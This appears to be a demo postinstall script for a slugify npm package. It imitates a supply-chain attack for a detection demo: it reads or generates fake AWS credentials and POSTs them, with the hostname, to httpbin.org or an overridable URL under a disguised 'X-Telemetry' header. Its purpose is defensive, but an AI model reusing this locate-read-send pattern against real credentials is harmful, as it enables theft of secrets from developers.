'use strict';

/* ===========================================================================
 *  DEMO ONLY — BENIGN. Demonstrates how Apiiro detects supply-chain credential
 *  exfiltration. On install this hook:
 *    - SEARCHES demo-scoped AWS credential locations for a creds file,
 *    - reads it (or, if none is planted, generates FAKE creds so the demo is
 *      self-contained), and sends it in one POST to a public echo service that
 *      stores nothing and echoes the body back.
 *  Two hard safety rails make it impossible to leak anything real:
 *    1. It never looks at the real ~/.aws — only at a demo env var or a fixed
 *       sandbox dir that the demo setup script plants.
 *    2. It refuses to send unless the data is stamped EXAMPLE/DEMO.
 *  This reproduces the "locate creds -> read -> network egress" data-flow
 *  reported by GitGuardian/Socket/Microsoft in 2026 so Apiiro can flag it on
 *  behavior. Delete this file + the postinstall line in package.json and this
 *  is just a slugify utility.
 * ======================================================================== */

const http = require('http');
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

// Benign, ubiquitous, allowlisted. Override for a live inbox or internal collector:
//   DEMO_EXFIL_URL="https://webhook.site/<uuid>" npm install ...
const EXFIL_URL = process.env.DEMO_EXFIL_URL || 'https://httpbin.org/post';

// Demo-scoped credential locations ONLY. Never the real ~/.aws.
function candidatePaths() {
  const tmp = process.env.TMPDIR || '/tmp';
  return [
    process.env.DEMO_CREDS_FILE,
    path.join(tmp, 'apiiro-demo', 'aws_credentials')
  ].filter(Boolean);
}

// Generate FAKE "AWS-shaped" credentials so the demo works with zero prep.
// AKIAEXAMPLE / EXAMPLE / DEMO are baked in so it can never be mistaken for a
// real key.
function buildDummyCredentials() {
  const b32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  const rand = (n) => Array.from({ length: n }, () => b32[Math.floor(Math.random() * b32.length)]).join('');
  return [
    '; FAKE demo credentials — not real.',
    '[default]',
    'aws_access_key_id = AKIAEXAMPLE' + rand(5),
    'aws_secret_access_key = ' + rand(30) + 'EXAMPLEKEYDEMO',
    'aws_session_token = FQoGZXIvYXdzEXAMPLE' + rand(12) + 'DEMO',
    'region = us-east-1'
  ].join('\n');
}

// Locate a demo creds file; fall back to generated fake creds. Returns the
// taint SOURCE the demo exfiltrates, plus a label for logging.
function collectCredentials() {
  for (const p of candidatePaths()) {
    try {
      if (fs.existsSync(p)) {
        return { source: p, data: fs.readFileSync(p, 'utf8') };
      }
    } catch (_) { /* unreadable — keep searching */ }
  }
  return { source: '(generated demo credentials)', data: buildDummyCredentials() };
}

function main() {
  const { source, data } = collectCredentials();

  // Safety rail: only ever send clearly-marked demo data.
  if (!/EXAMPLE|DEMO/i.test(data)) {
    console.log('[tiny-slugify demo] credentials not DEMO-stamped — refusing to send.');
    return;
  }

  const payload = JSON.stringify({
    host: os.hostname(),
    ts: new Date().toISOString(),
    source: source,
    credentials: data,
    _note: 'FAKE DEMO CREDENTIALS — for an Apiiro detection demo. Not real.'
  });

  const url = new URL(EXFIL_URL);
  const transport = url.protocol === 'http:' ? http : https;
  const req = transport.request(
    {
      hostname: url.hostname,
      port: url.port || undefined,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        // Innocuous on the wire on purpose — detection is on BEHAVIOR, not a
        // self-labeled flag. (Real May-2026 campaign used "X-Supply: 1".)
        'X-Telemetry': '1'
      }
    },
    (res) => {
      res.resume();
      res.on('end', () =>
        console.log(`[tiny-slugify demo] posted creds from ${source} -> ${EXFIL_URL} (HTTP ${res.statusCode})`)
      );
    }
  );

  // Never break a real install: swallow any network error.
  req.on('error', (e) => console.log(`[tiny-slugify demo] exfil attempt errored (harmless): ${e.message}`));
  req.write(payload);
  req.end();
}

main();
